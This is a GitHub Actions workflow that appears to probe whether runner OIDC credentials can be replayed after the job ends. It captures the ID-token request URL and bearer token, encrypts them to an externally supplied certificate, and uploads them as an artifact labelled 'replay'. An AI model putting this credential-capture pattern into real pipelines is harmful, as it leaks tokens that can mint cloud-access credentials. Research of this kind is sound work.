name: c9-post-job-oidc

on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read
  id-token: write

jobs:
  issuer:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Mint baseline and seal OIDC request tuple
        uses: actions/github-script@v8
        env:
          C9_RECIPIENT_CERT_B64: 
        with:
          script: |
            const fs = require("fs");
            const path = require("path");
            const crypto = require("crypto");
            const childProcess = require("child_process");
            for (const field of ["ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_ID_TOKEN_REQUEST_TOKEN"]) {
              if (!process.env[field]) throw new Error("missing " + field);
            }
            const decodeSegment = value => {
              const padded = value.replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(value.length / 4) * 4, "=");
              return JSON.parse(Buffer.from(padded, "base64").toString("utf8"));
            };
            const baselineAudience = "c9-baseline-" + process.env.GITHUB_RUN_ID;
            const baselineToken = await core.getIDToken(baselineAudience);
            const baselineParts = baselineToken.split(".");
            if (baselineParts.length !== 3) throw new Error("baseline token is not a JWT");
            const baselineHeader = decodeSegment(baselineParts[0]);
            const baselineClaims = decodeSegment(baselineParts[1]);
            if (baselineClaims.aud !== baselineAudience) throw new Error("baseline audience mismatch");
            if (baselineClaims.iss !== "https://token.actions.githubusercontent.com") throw new Error("baseline issuer mismatch");
            const bundle = path.join(process.env.GITHUB_WORKSPACE, "c9-replay");
            const plaintext = path.join(process.env.RUNNER_TEMP, "c9-payload.json");
            const cert = path.join(process.env.RUNNER_TEMP, "c9-recipient-cert.pem");
            fs.mkdirSync(bundle, {recursive: true});
            fs.writeFileSync(plaintext, JSON.stringify({
              ACTIONS_ID_TOKEN_REQUEST_URL: process.env.ACTIONS_ID_TOKEN_REQUEST_URL,
              ACTIONS_ID_TOKEN_REQUEST_TOKEN: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN,
              GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
              GITHUB_REF: process.env.GITHUB_REF,
              GITHUB_SHA: process.env.GITHUB_SHA,
            }), {mode: 0o600});
            fs.writeFileSync(cert, Buffer.from(process.env.C9_RECIPIENT_CERT_B64, "base64"), {mode: 0o600});
            childProcess.execFileSync("openssl", [
              "cms", "-encrypt", "-binary", "-aes-256-cbc",
              "-in", plaintext,
              "-out", path.join(bundle, "c9-payload.p7m"),
              "-outform", "DER",
              "-recip", cert,
            ]);
            fs.rmSync(plaintext);
            fs.rmSync(cert);
            const safeClaims = {};
            for (const name of ["iss", "sub", "aud", "iat", "nbf", "exp", "repository", "ref", "sha", "run_id", "run_number", "workflow_ref", "job_workflow_ref"]) {
              if (Object.prototype.hasOwnProperty.call(baselineClaims, name)) safeClaims[name] = baselineClaims[name];
            }
            fs.writeFileSync(path.join(bundle, "metadata.json"), JSON.stringify({
              issuerRunId: process.env.GITHUB_RUN_ID,
              captureUtc: new Date().toISOString(),
              baselineAudience,
              baselineTokenSha256: crypto.createHash("sha256").update(baselineToken).digest("hex"),
              baselineHeader,
              baselineClaims: safeClaims,
              requestUrlHost: new URL(process.env.ACTIONS_ID_TOKEN_REQUEST_URL).host,
            }));
      - name: Upload encrypted OIDC request carrier
        uses: actions/upload-artifact@v4
        with:
          name: c9-replay-${{ github.run_id }}
          path: c9-replay/
          if-no-files-found: error
          retention-days: 1

